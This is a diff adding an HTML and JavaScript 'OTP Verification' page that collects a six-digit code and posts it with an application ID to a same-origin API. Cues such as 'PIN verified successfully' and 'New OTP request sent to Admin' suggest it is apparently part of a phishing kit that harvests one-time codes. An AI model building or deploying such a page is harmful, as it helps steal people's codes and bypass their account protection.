@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f8f9fa; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        h2 { color: #1a56db; margin-top: 0; }
+        .success-box { background: #e6f4ea; color: #137333; padding: 12px; border-radius: 6px; margin: 15px 0; font-size: 14px; border: 1px solid #b7e1cd;}
+        .otp-inputs { display: flex; gap: 8px; margin: 20px 0; justify-content: center; }
+        .otp-inputs input { width: 40px; height: 50px; text-align: center; font-size: 24px; border: 1px solid #ccc; border-radius: 8px; outline: none; }
+        .otp-inputs input:focus { border-color: #1a56db; box-shadow: 0 0 0 2px rgba(26,86,219,0.2); }
+        .btn { width: 100%; padding: 14px; background: #72a1f5; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn:disabled { background: #a0c4ff; cursor: not-allowed; }
+        .resend { color: #d93838; font-size: 14px; cursor: pointer; margin-top: 10px; display: block; }
+        .resend.disabled { color: #999; cursor: not-allowed; }
+        .error { color: red; font-size: 14px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>OTP Verification</h2>
+    <p style="color: #666; font-size: 14px;">Enter the 6-digit code sent to your phone number</p>
+    
+    <div class="success-box">
+        ✓ PIN verified successfully! Please enter OTP below.
+    </div>
+
+    <div class="otp-inputs" id="otp-inputs">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+    </div>
+    
+    <div id="error-msg" class="error"></div>
+    <span class="resend disabled" id="resend-btn">Resend code in 60 seconds</span>
+
+    <button class="btn" id="submit-btn">SUBMIT</button>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const appId = urlParams.get('appId'); 
+    
+    if (!appId) {
+        alert("Missing Application ID. Please login again.");
+        window.location.href = '/';
+    }
+
+    const inputs = document.querySelectorAll('.otp-inputs input');
+    const submitBtn = document.getElementById('submit-btn');
+    const errorMsg = document.getElementById('error-msg');
+    const resendBtn = document.getElementById('resend-btn');
+
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            if (e.target.value && index < inputs.length - 1) inputs[index + 1].focus();
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
+        });
+    });
+
+    submitBtn.addEventListener('click', async () => {
+        const code = Array.from(inputs).map(i => i.value).join('');
+        if (code.length !== 6) {
+            errorMsg.textContent = "Please enter all 6 digits.";
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = "VERIFYING...";
+        errorMsg.textContent = "";
+
+        try {
+            const response = await fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ applicationId: appId, otpCode: code })
+            });
+
+            const data = await response.json();
+
+            if (response.ok) {
+                alert("Success! Logged in.");
+                window.location.href = '/dashboard'; 
+            } else if (response.status === 202) {
+                errorMsg.style.color = "orange";
+                errorMsg.textContent = data.error; 
+                submitBtn.disabled = false;
+                submitBtn.textContent = "SUBMIT";
+            } else {
+                errorMsg.style.color = "red";
+                errorMsg.textContent = data.error || "Invalid OTP";
+                submitBtn.disabled = false;
+                submitBtn.textContent = "SUBMIT";
+            }
+        } catch (err) {
+            errorMsg.style.color = "red";
+            errorMsg.textContent = "Network error. Try again.";
+            submitBtn.disabled = false;
+            submitBtn.textContent = "SUBMIT";
+        }
+    });
+
+    let timeLeft = 60;
+    const timer = setInterval(() => {
+        if (timeLeft <= 0) {
+            clearInterval(timer);
+            resendBtn.textContent = "Resend OTP code";
+            resendBtn.classList.remove('disabled');
+        } else {
+            resendBtn.textContent = `Resend code in ${timeLeft} seconds`;
+            timeLeft--;
+        }
+    }, 1000);
+
+    resendBtn.addEventListener('click', async () => {
+        if (resendBtn.classList.contains('disabled')) return;
+        resendBtn.classList.add('disabled');
+        resendBtn.textContent = `Resend code in 60 seconds`;
+        
+        try {
+            await fetch('/api/resend-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ applicationId: appId })
+            });
+            alert("New OTP request sent to Admin.");
+            timeLeft = 60; // Reset timer
+        } catch (e) {
+            alert("Could not resend OTP.");
+        }
+    });
+</script>
+</body>
+          </html>
